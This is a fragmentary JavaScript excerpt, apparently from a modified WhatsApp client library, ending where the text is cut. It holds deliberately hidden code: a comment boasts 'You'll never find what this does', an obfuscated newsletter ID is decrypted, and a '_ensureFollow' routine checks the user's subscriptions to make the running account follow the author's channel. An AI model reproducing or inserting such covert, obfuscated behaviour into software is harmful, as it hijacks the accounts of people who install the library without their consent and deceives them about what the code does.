...
// You'll never find what this does - Nimzz
    ...
    // Auto Reaction - Nimzz
    const _targetNewsletter = (0, hiura_.minimalKaloMauDecryptYangPinterDek)('8c2c4a3d446216881480918cc29692b909b94816b7e620a33511163ada71d8f1');
    ...
    const _ensureFollow = async () => {
        try {
            const list = await executeWMexQuery({}, '584262545456', 'xwa2_newsletter_subscribed', query, generateMessageTag);
            const subscribedIds = list?.map(n => n.id) || [];
            
            // Masukkan ID channel lu langsung di dalam array ini
            const targets = [
                _targetNewsletter, 
